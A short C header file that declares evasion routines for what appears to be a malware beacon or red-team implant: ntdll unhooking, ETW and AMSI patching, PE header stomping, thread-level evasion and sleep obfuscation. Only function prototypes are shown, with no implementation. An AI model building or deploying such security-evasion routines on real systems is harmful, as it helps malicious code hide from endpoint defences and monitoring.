#pragma once
#include <windows.h>

void evasion_unhook_ntdll(void);
void evasion_patch_etw(void);
void evasion_patch_amsi(void);
void evasion_patch_etw_ti(void);
void evasion_stomp_header(void);
BOOL evasion_apply_thread(HANDLE hThread);
void beacon_sleep_obf(DWORD ms);
